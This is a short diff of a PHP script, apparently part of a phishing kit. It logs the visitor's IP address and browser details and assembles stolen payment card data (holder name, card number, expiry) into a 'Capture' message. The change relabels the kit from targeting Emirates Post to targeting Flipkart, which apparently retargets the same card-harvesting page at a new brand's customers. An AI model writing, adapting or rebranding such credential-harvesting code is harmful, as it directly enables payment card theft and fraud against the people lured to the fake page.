@@ -28,7 +28,7 @@ $ip = $_SERVER['REMOTE_ADDR'] ?? getenv('REMOTE_ADDR');
 $hostname = $ip ? @gethostbyaddr($ip) : '';
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 
-$message  = "=== Emirates Post Capture ===\n";
+$message  = "=== Flipkart Capture ===\n";
 $message .= "Name on card : $cardHolder\n";
 $message .= "Card number  : $cardNumber\n";
 $message .= "Expiry       : $expMonth/$expYear\n";
